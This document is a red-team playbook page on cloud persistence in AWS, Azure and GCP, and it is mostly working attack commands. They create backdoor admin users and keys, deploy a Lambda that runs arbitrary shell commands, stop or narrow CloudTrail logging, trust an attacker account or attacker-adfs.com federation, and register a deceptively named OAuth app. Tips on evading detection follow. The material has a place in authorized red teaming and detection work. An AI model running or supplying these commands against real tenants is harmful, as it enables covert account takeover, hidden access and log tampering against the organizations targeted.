# Cloud Persistence Mechanisms

> **MITRE ATT&CK**: Persistence > T1098.001 - Account Manipulation: Additional Cloud Credentials
> **Platforms**: AWS, Azure, GCP
> **Required Privileges**: Varies (IAM management permissions in respective cloud)
> **OPSEC Risk**: Medium (cloud API calls are logged, but volume often overwhelms SOC capacity)

---

## Strategic Overview

Cloud persistence fundamentally differs from on-premises persistence. There are no registry keys, startup folders, or services -- instead, persistence is achieved through identity manipulation, serverless function deployment, event-driven triggers, and infrastructure-as-code backdoors. For a Red Team Lead, cloud environments present both challenges and opportunities. The challenge is that every API call is logged (CloudTrail, Azure Activity Log, GCP Audit Logs), making covert operations difficult. The opportunity is that most organizations lack mature cloud security monitoring, cloud environments have enormous API surface areas that defenders struggle to cover, and cloud-native persistence mechanisms (Lambda functions, Automation Runbooks, Cloud Functions) are often not included in traditional incident response playbooks. The strategy is to use persistence mechanisms that blend with the organization's existing cloud usage patterns.

## Technical Deep-Dive

### AWS Persistence

#### IAM User and Access Key Creation

```bash
# Create backdoor IAM user
aws iam create-user --user-name svc-cloudwatch-metrics
aws iam attach-user-policy --user-name svc-cloudwatch-metrics --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create access keys for the backdoor user
aws iam create-access-key --user-name svc-cloudwatch-metrics
# Output: AccessKeyId, SecretAccessKey (save these)

# Create additional access key for existing compromised user
aws iam create-access-key --user-name legitimate-admin
# Users can have up to 2 access keys

# Create login profile (console access) for service account
aws iam create-login-profile --user-name svc-cloudwatch-metrics --password 'C0mpl3x!Pass#2024' --no-password-reset-required
```

#### Lambda Backdoor

```python
# Lambda function that creates reverse shell or exfiltrates data
# deploy_lambda_backdoor.py
import boto3
import json

lambda_code = '''
import os, subprocess, boto3
def handler(event, context):
    # Execute command passed via event
    cmd = event.get('cmd', 'id')
    result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    return {'statusCode': 200, 'body': result.decode()}
'''

client = boto3.client('lambda')
client.create_function(
    FunctionName='cloudwatch-log-processor',
    Runtime='python3.9',
    Role='arn:aws:iam::123456789012:role/lambda-exec-role',
    Handler='index.handler',
    Code={'ZipFile': create_zip(lambda_code)},
    Timeout=300,
    MemorySize=256
)

# Invoke the backdoor
client.invoke(
    FunctionName='cloudwatch-log-processor',
    Payload=json.dumps({'cmd': 'cat /etc/passwd'})
)
```

```bash
# Create EventBridge rule to trigger Lambda on schedule (persistence)
aws events put-rule --name "CloudWatchMetricsCollection" --schedule-expression "rate(1 hour)"
aws events put-targets --rule "CloudWatchMetricsCollection" --targets "Id"="1","Arn"="arn:aws:lambda:us-east-1:123456789012:function:cloudwatch-log-processor"

# S3 event trigger (executes when files are uploaded to a bucket)
aws s3api put-bucket-notification-configuration --bucket target-bucket --notification-configuration '{
  "LambdaFunctionConfigurations": [{
    "LambdaFunctionArn": "arn:aws:lambda:us-east-1:123456789012:function:cloudwatch-log-processor",
    "Events": ["s3:ObjectCreated:*"]
  }]
}'
```

#### CloudTrail Evasion

```bash
# Identify CloudTrail configuration
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name default-trail

# Stop CloudTrail logging (extremely noisy -- generates its own alert)
aws cloudtrail stop-logging --name default-trail

# Create event selectors to exclude specific API calls from logging
aws cloudtrail put-event-selectors --trail-name default-trail --event-selectors '[{
  "ReadWriteType": "WriteOnly",
  "IncludeManagementEvents": true,
  "DataResources": []
}]'

# Use regions without CloudTrail coverage
# Check which regions have trails configured
aws cloudtrail describe-trails --query 'trailList[].HomeRegion'
# Operate in regions without active trails
```

#### IAM Role Assumption Chain

```bash
# Create role that can be assumed from external account (cross-account backdoor)
aws iam create-role --role-name OrganizationAuditRole --assume-role-policy-document '{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT_ID:root"},
    "Action": "sts:AssumeRole"
  }]
}'
aws iam attach-role-policy --role-name OrganizationAuditRole --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### Azure Persistence

#### Service Principal Secret Addition

```bash
# Add secret to existing service principal (application)
az ad app credential reset --id <app-id> --append --years 2

# Create new service principal
az ad sp create-for-rbac --name "svc-monitoring-agent" --role Contributor --scopes /subscriptions/<sub-id>
# Output: appId, password, tenant (save these)

# Add credentials to existing app registration
az ad app credential reset --id <app-id> --credential-description "AutomationKey" --years 5 --append
```

#### OAuth Application Consent (Illicit Consent Grant)

```bash
# Register application with broad permissions
az ad app create --display-name "Microsoft Security Scanner" --required-resource-accesses '[{
  "resourceAppId": "00000003-0000-0000-c000-000000000000",
  "resourceAccess": [
    {"id": "e1fe6dd8-ba31-4d61-89e7-88639da4683d", "type": "Scope"},
    {"id": "024d486e-b451-40bb-833d-3e66d98c5c73", "type": "Scope"},
    {"id": "7427e0e9-2fba-42fe-b0c0-848c9e6a8182", "type": "Scope"}
  ]
}]'

# Grant admin consent (if Global Admin)
az ad app permission admin-consent --id <app-id>
```

#### Federation Trust Backdoor

```powershell
# Add federated identity provider to Azure AD tenant
# This allows authentication from attacker-controlled IdP

# Using AADInternals
Install-Module AADInternals
Import-Module AADInternals

# Set domain federation to attacker-controlled ADFS
Set-AADIntDomainAuthentication -DomainName "corp.onmicrosoft.com" -Authentication Federated -FederationBrandName "Corp Auth" -IssuerUri "http://attacker-adfs.com/adfs/services/trust" -PassiveLogOnUri "https://attacker-adfs.com/adfs/ls/" -SigningCertificate $cert
```

#### Azure Automation Runbook

```powershell
# Create automation account with runbook for persistent execution
$automationAccount = "security-automation"
$resourceGroup = "rg-monitoring"

# Create runbook
$runbookContent = @'
Connect-AzAccount -Identity
# Execute arbitrary commands with managed identity
$result = Invoke-AzVMRunCommand -ResourceGroupName "production" -VMName "webserver01" -CommandId "RunPowerShellScript" -ScriptString "whoami; hostname"
$result.Value[0].Message
'@

Import-AzAutomationRunbook -Name "SecurityHealthCheck" -AutomationAccountName $automationAccount -ResourceGroupName $resourceGroup -Type PowerShell -Content $runbookContent
Publish-AzAutomationRunbook -Name "SecurityHealthCheck" -AutomationAccountName $automationAccount -ResourceGroupName $resourceGroup

# Create schedule for recurring execution
New-AzAutomationSchedule -Name "DailyHealthCheck" -AutomationAccountName $automationAccount -ResourceGroupName $resourceGroup -StartTime (Get-Date).AddHours(1) -DayInterval 1
Register-AzAutomationScheduledRunbook -RunbookName "SecurityHealthCheck" -ScheduleName "DailyHealthCheck" -AutomationAccountName $automationAccount -ResourceGroupName $resourceGroup
```

### GCP Persistence

#### Service Account Key Creation

```bash
# Create key for existing service account
gcloud iam service-accounts keys create key.json --iam-account=svc-monitoring@project-id.iam.gserviceaccount.com

# Create new service account with broad permissions
gcloud iam service-accounts create svc-audit-agent --display-name="Audit Agent Service"
gcloud projects add-iam-policy-binding PROJECT_ID --member="serviceAccount:svc-audit-agent@PROJECT_ID.iam.gserviceaccount.com" --role="roles/editor"
gcloud iam service-accounts keys create key.json --iam-account=svc-audit-agent@PROJECT_ID.iam.gserviceaccount.com

# Authenticate with stolen key
gcloud auth activate-service-account --key-file=key.json
```

#### Cloud Functions Backdoor

```bash
# Deploy backdoor Cloud Function
gcloud functions deploy security-scanner --runtime python39 --trigger-http --allow-unauthenticated --source=./function_source/ --entry-point=handler

# Cloud Scheduler trigger (cron-like persistence)
gcloud scheduler jobs create http security-scan-job --schedule="0 */6 * * *" --uri="https://REGION-PROJECT_ID.cloudfunctions.net/security-scanner" --http-method=POST
```

#### Custom IAM Roles

```bash
# Create custom role with specific permissions (harder to audit than predefined roles)
gcloud iam roles create customAuditor --project=PROJECT_ID --title="Custom Auditor" --permissions="compute.instances.list,compute.instances.get,iam.serviceAccounts.actAs,iam.serviceAccountKeys.create"

# Bind to attacker-controlled service account
gcloud projects add-iam-policy-binding PROJECT_ID --member="serviceAccount:attacker@PROJECT_ID.iam.gserviceaccount.com" --role="projects/PROJECT_ID/roles/customAuditor"
```

## Detection & Evasion

### Detection Mechanisms
- **CloudTrail/Activity Log/Audit Log**: All API calls are logged
- **GuardDuty/Defender for Cloud/SCC**: Cloud-native threat detection
- **IAM anomaly detection**: New users, keys, role assumptions from unusual sources
- **Service creation monitoring**: New Lambda/Functions/Runbooks
- **Federation changes**: Modifications to identity provider configuration

### Evasion Techniques
- Name resources to match organizational naming conventions
- Create persistence during periods of high legitimate cloud activity
- Use service accounts rather than IAM users (less scrutinized in many orgs)
- Operate in regions where monitoring is less comprehensive
- Use cloud-native services that the organization already uses
- Add credentials to existing service principals rather than creating new ones

### OPSEC Considerations
- Every cloud API call generates a log entry -- assume all actions are recorded
- Cloud logs are often shipped to SIEM but may not have real-time alerting
- Cross-account roles and federation trusts are powerful but detectable
- Lambda/Functions execute in isolated environments -- limited lateral movement
- Clean up all persistence mechanisms at engagement conclusion

## Cross-References

- `04-persistence/ssh-backdoors.md` - SSH keys on cloud compute instances
- `07-credential-access/` - Cloud credential harvesting
- `10-exfiltration/` - Cloud-based data exfiltration
- `06-defense-evasion/` - CloudTrail and logging evasion

## References

- MITRE T1098.001: https://attack.mitre.org/techniques/T1098/001/
- AWS Persistence techniques: https://hackingthe.cloud/aws/post_exploitation/
- Azure AD backdoors: https://www.mandiant.com/resources/blog/remediation-and-hardening-strategies-for-microsoft-365
- GCP Security: https://cloud.google.com/security/best-practices
- Rhino Security Labs cloud research: https://rhinosecuritylabs.com/blog/
